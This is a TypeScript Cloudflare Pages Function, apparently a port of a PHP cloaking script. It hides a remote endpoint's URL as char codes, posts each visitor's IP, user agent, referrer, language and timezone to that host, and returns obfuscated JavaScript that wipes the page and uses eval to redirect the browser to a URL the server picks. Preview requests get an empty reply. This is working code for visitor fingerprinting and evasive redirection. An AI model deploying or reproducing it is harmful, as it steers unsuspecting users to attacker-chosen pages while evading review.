// Cloudflare Pages Function to replicate the full PHP logic
// This function mimics the behavior of the original index.php

interface RequestData {
  tz?: string;
  qu?: string;
  r?: string;
  sn?: string;
  rui?: string;
  co?: string;
  he?: string;
}

// Function c equivalent
function c(u: string | null = null, q: string | null = null): string {
  if (!u) {
    return '$("#lo511457ad").hide();$("body").fadeIn(500);';
  } else {
    const fullUrl = u + (q || "");
    const charCodes: number[] = [];

    for (let i = 0; i < fullUrl.length; i++) {
      charCodes.push(fullUrl.charCodeAt(i));
    }

    const reversed = charCodes.join(",").split("").reverse().join("");

    return `function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();$("html").append("body").html("<div style=\\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\\">Please Wait for Page to Load...</div>");s = rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("${reversed}");c = s+"'"+u+"'";eval(c);$("html").show();`;
  }
}

// Decode the URL from the char array
function decodeUrl(): string {
  const charArray = [
    104, 116, 116, 112, 115, 58, 47, 47, 106, 99, 105, 98, 106, 46, 99, 111,
    109, 47, 112, 99, 108, 46, 112, 104, 112,
  ];
  return String.fromCharCode(...charArray);
}

// Handle POST request
export async function onRequestPost(context: { request: Request }) {
  const request = context.request;

  // Check for X-Purpose header
  const xPurpose = request.headers.get("X-Purpose");
  if (xPurpose === "preview") {
    return new Response("", { status: 200 });
  }

  try {
    // Parse form data
    const formData = await request.formData();
    const data: RequestData = {
      tz: formData.get("tz") as string,
      qu: formData.get("qu") as string,
      r: formData.get("r") as string,
      sn: formData.get("sn") as string,
      rui: formData.get("rui") as string,
      co: formData.get("co") as string,
      he: formData.get("he") as string,
    };

    if (data.tz) {
      const date = new Date().toISOString().replace("T", " ").substring(0, 19);
      const id = "511457";
      const uid = "12sqgyz7i2h4yix9hipa40uci";
      const qu = data.qu || "";

      // Prepare data for external API
      const externalData = {
        date: date,
        lan: request.headers.get("Accept-Language") || "",
        ref: data.r || "",
        ip:
          request.headers.get("CF-Connecting-IP") ||
          request.headers.get("X-Forwarded-For") ||
          "",
        ipr: request.headers.get("X-Forwarded-For") || "",
        sn: data.sn || "",
        requestUri: data.rui || "",
        query: qu,
        ua: request.headers.get("User-Agent") || "",
        co: data.co || "",
        tz: data.tz,
        he: data.he || "",
        user_id: uid,
        id: id,
      };

      try {
        // Make request to external API
        const externalUrl = decodeUrl();
        const response = await fetch(externalUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams(externalData).toString(),
        });

        const result = await response.text();
        const arr = result.split(",");

        let q = "";
        if (qu) {
          if (arr[1] && arr[1].includes("?")) {
            q = "&" + qu;
          } else {
            q = "?" + qu;
          }
        }

        let responseText = "";

        if (arr[0] === "true") {
          if (arr[1] && arr[1].includes("sp.php")) {
            q = "?" + qu;
          }

          // Note: Cloudflare Workers don't support setcookie in the same way
          // Cookies would need to be handled differently in a real implementation

          responseText = c(arr[1], q);
        } else if (arr[0] === "false") {
          const f = arr[5] ? q : "";
          responseText = c(arr[1], f);
        } else {
          responseText = c();
        }

        return new Response(responseText, {
          status: 200,
          headers: {
            "Content-Type": "text/html",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
          },
        });
      } catch {
        // If external API fails, return default response
        return new Response(c(), {
          status: 200,
          headers: {
            "Content-Type": "text/html",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
          },
        });
      }
    }

    // Default response if no tz parameter
    return new Response(c(), {
      status: 200,
      headers: {
        "Content-Type": "text/html",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
      },
    });
  } catch {
    return new Response(c(), {
      status: 200,
      headers: {
        "Content-Type": "text/html",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
      },
    });
  }
}

// Handle OPTIONS request for CORS preflight
export async function onRequestOptions() {
  return new Response(null, {
    status: 200,
    headers: {
      "Content-Type": "text/html",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}

// Handle GET request (fallback)
export async function onRequestGet() {
  return new Response(c(), {
    status: 200,
    headers: {
      "Content-Type": "text/html",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}
